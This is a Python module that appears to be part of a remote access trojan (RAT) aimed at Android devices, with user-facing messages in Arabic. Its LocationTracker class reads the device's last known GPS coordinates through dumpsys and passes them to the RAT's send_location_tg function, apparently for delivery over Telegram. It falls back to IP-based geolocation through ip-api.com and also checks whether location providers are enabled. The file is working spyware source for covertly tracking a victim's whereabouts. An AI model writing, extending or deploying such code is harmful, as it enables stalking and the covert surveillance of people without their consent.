import re, subprocess, requests

class LocationTracker:
    def __init__(self, rat_instance):
        self.rat = rat_instance

    def get_location(self) -> str:
        for method in [self._dumpsys, self._ip_geo]:
            try:
                result = method()
                if result:
                    return result
            except:
                continue
        return "❌ لا يمكن تحديد الموقع"

    def _dumpsys(self) -> str:
        output = subprocess.getoutput("dumpsys location 2>/dev/null | grep -A 8 'Last Known' | head -40")
        if not output:
            return ""
        coords = re.findall(r'[-]?\d{2,3}\.\d{3,8}', output)
        if len(coords) >= 2:
            lat, lon = float(coords[0]), float(coords[1])
            self.rat.send_location_tg(lat, lon)
            return f"📍 الموقع\nخط العرض: {lat}\nخط الطول: {lon}\n🔗 https://maps.google.com/?q={lat},{lon}"
        return ""

    def _ip_geo(self) -> str:
        try:
            resp = requests.get("http://ip-api.com/json/", timeout=5)
            if resp.status_code == 200:
                d = resp.json()
                if d.get('lat') and d.get('lon'):
                    return f"📍 تقريبي (IP)\nالدولة: {d.get('country','?')}\nالمدينة: {d.get('city','?')}\nISP: {d.get('isp','?')}\n🔗 https://maps.google.com/?q={d['lat']},{d['lon']}"
        except:
            pass
        return ""

    def check_gps_status(self) -> str:
        providers = subprocess.getoutput("settings get secure location_providers_allowed 2>/dev/null").strip()
        gps = "gps" in providers.lower() if providers else False
        net = "network" in providers.lower() if providers else False
        return f"📡 GPS: {'✅' if gps else '❌'} | Network: {'✅' if net else '❌'}"
